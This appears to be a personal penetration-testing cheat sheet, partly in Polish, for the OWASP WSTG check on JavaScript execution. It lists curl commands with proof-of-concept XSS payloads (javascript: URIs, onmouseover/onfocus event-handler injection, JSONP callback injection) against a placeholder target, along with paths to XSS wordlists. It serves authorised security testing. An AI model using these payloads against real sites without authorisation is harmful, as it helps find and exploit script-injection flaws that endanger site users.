# WSTG-CLNT-02 — Testing for JavaScript Execution

## Cele

- Identify sinks and possible JavaScript injection points

## KOMENDY

### Test javascript: URI

```bash
curl -s "https://TARGET/redirect?url=javascript:alert(1)"
curl -s "https://TARGET/page?link=javascript:alert(document.domain)"

```

### Test event handlers

```bash
curl -s "https://TARGET/page?input=\"onmouseover=\"alert(1)\""
curl -s "https://TARGET/page?input='onfocus='alert(1)' autofocus='"

```

### Test eval/Function context

```bash
curl -s "https://TARGET/page?callback=alert(1)"
curl -s "https://TARGET/api/data?callback=alert" # JSONP

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings XSS

```bash
# Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Intruders/xss_alert.txt
# Desktop/WSTG/PayloadsAllTheThings-master/XSS Injection/Intruders/0xcela_event_handlers.txt

```

### fuzzdb event handlers

```bash
# Desktop/WSTG/fuzzdb-master/attack/xss/html-event-attributes.txt

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Szukaj javascript: URI w linkach i przekierowaniach
2. Testuj event handlers w kontekstach HTML
3. Sprawdz JSONP endpointy pod katem callback injection
4. Analizuj kod JS pod katem eval(), Function(), setTimeout() z user input

